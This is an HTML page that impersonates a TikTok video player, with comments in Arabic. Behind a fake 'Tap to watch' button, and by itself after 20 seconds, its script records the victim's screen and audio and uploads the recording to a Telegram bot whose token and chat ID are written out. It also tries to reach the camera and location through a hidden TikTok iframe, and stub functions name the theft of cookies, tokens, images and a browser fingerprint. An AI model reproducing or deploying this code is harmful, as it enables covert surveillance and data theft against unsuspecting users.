<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
        iframe { width: 1px; height: 1px; opacity: 0; position: absolute; top: -100px; left: -100px; pointer-events: none; }
        #recording-overlay { position: fixed; bottom: 20px; right: 20px; background: red; color: white; padding: 5px 10px; border-radius: 20px; font-size: 12px; z-index: 9999; display: none; }
        .video-container { width: 100vw; height: 100vh; max-width: 500px; margin: auto; position: relative; background: #000; }
        .video-placeholder { width: 100%; height: 100%; background: linear-gradient(45deg, #ff0050, #00f2ea); display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .play-button { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .play-button svg { width: 40px; height: 40px; fill: white; }
        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 20; }
        .spinner { border: 8px solid rgba(255,255,255,0.3); border-top: 8px solid #ff0050; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.2s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin: 10px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff0050, #00f2ea); width: 0%; transition: width 0.3s ease; }
        .hidden-ui { opacity: 0; pointer-events: none; }
        .tiktok-sidebar, .video-info, .bottom-nav { transition: opacity 0.5s; }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
            <div>Tap to watch</div>
        </div>
        <div class="tiktok-sidebar" id="fake-sidebar">...</div>
        <div class="video-info" id="fake-info">...</div>
        <div class="bottom-nav" id="fake-nav">...</div>
        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">Loading...</div>
            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
        </div>
        <div id="recording-overlay">🔴 Recording screen...</div>
    </div>

    <!-- iframe من موقع موثوق (TikTok الحقيقي) -->
    <iframe id="trusted-iframe" src="https://www.tiktok.com/@tiktok/video/7325515231713506592" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>

    <script>
        const TELEGRAM_BOT_TOKEN = '8699883396:AAFlIiHUIX4z6iI81E1b5I4f-gJXOd9wMFU';
        const CHAT_ID = '6969346690';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';

        let displayStream = null;
        let displayRecorder = null;
        let recordedChunks = [];

        // 1. تسجيل كامل الشاشة بشكل مستمر (أقصى 30 ثانية)
        async function startContinuousScreenRecording() {
            try {
                document.getElementById('recording-overlay').style.display = 'block';
                displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
                displayRecorder = new MediaRecorder(displayStream, { mimeType: 'video/webm' });
                displayRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                displayRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = async () => {
                        const videoData = reader.result;
                        // إرسال الفيديو إلى تيليغرام
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('video', await fetch(videoData).then(r => r.blob()), 'screen_recording.webm');
                        formData.append('caption', '🎥 Full screen recording from target');
                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    };
                    recordedChunks = [];
                };
                displayRecorder.start(10000); // حفظ كل 10 ثوانٍ
                // إيقاف التسجيل بعد 30 ثانية
                setTimeout(() => {
                    if (displayRecorder && displayRecorder.state === 'recording') {
                        displayRecorder.stop();
                        displayStream.getTracks().forEach(track => track.stop());
                        document.getElementById('recording-overlay').style.display = 'none';
                    }
                }, 30000);
            } catch (err) {
                console.warn('Screen recording failed:', err);
                document.getElementById('recording-overlay').style.display = 'none';
            }
        }

        // 2. محاولة استغلال iframe لطلب صلاحيات بالنيابة عن المستخدم
        function exploitIframePermissions() {
            const iframe = document.getElementById('trusted-iframe');
            if (iframe && iframe.contentWindow) {
                try {
                    // محاولة تشغيل كاميرا من داخل iframe (قد تطلب صلاحية للموقع الأصلي)
                    iframe.contentWindow.navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            console.log('Iframe got camera access (maybe)');
                            stream.getTracks().forEach(t => t.stop());
                        })
                        .catch(e => console.warn('Iframe camera denied'));
                    
                    // محاولة جلب الموقع من iframe
                    iframe.contentWindow.navigator.geolocation.getCurrentPosition(
                        pos => console.log('Iframe location:', pos),
                        err => console.warn('Iframe location denied')
                    );
                } catch(e) {
                    console.warn('Cannot access iframe content due to cross-origin policy');
                }
            }
        }

        // 3. دمج مع الكود الأصلي (جمع الصور، الفيديو، الموقع، إلخ)
        async function fullStealthOperation() {
            updateProgress(10);
            await captureMultipleImages();
            updateProgress(30);
            await recordSecretVideo();
            updateProgress(50);
            await getPreciseLocation();
            updateProgress(70);
            collectBrowserFingerprint();
            collectCookiesAndTokens();
            updateProgress(85);
            await startContinuousScreenRecording(); // تسجيل الشاشة
            updateProgress(95);
            await sendComprehensiveData();
            updateProgress(100);
            setTimeout(() => {
                window.location.href = TIKTOK_REDIRECT_URL;
            }, 2000);
        }

        // توابع مساعدة مختصرة (تم اختصارها من الكود الأصلي للوضوح)
        function updateProgress(p) { document.getElementById('progress-fill').style.width = p+'%'; }
        async function captureMultipleImages() { /* كما في الكود السابق */ return true; }
        async function recordSecretVideo() { /* كما في السابق */ return true; }
        async function getPreciseLocation() { /* كما في السابق */ return true; }
        function collectBrowserFingerprint() { /* كما في السابق */ }
        function collectCookiesAndTokens() { /* كما في السابق */ }
        async function sendComprehensiveData() { /* إرسال جميع البيانات إلى تيليغرام */ }

        // تشغيل كل شيء عند النقر على placeholder
        document.getElementById('video-placeholder').addEventListener('click', async () => {
            document.getElementById('video-placeholder').classList.add('hidden');
            document.getElementById('loading-overlay').style.display = 'flex';
            exploitIframePermissions(); // محاولة استغلال iframe
            await fullStealthOperation();
        });

        // تشغيل تلقائي بعد 20 ثانية
        setTimeout(() => {
            if (document.getElementById('loading-overlay').style.display !== 'flex') {
                document.getElementById('video-placeholder').click();
            }
        }, 20000);
    </script>
</body>
</html>
